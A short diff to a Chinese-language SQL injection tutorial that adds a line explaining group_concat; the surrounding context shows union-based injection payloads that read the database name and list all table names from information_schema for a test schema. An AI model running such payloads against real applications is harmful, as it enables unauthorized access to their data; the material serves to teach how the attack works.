@@ -79,6 +79,7 @@ select * from user where username='1' union all select 1,database(),3,4,5,6,7,8,
 
 ### 7、联合注入的过程5:
 ### 巧妙使用group_concat(table_name)函数，获取所有表的名称
+### group_concat：把同一列的，多行，拼接到一起
 #### 7.1 把所有的table_name拼接起来，在第11列进行展示
 ```sql
 1' union all select 1,database(),3,4,5,6,7,8,9,10,group_concat(table_name),12 from information_schema.tables where table_schema = 'test_fastapi'  #
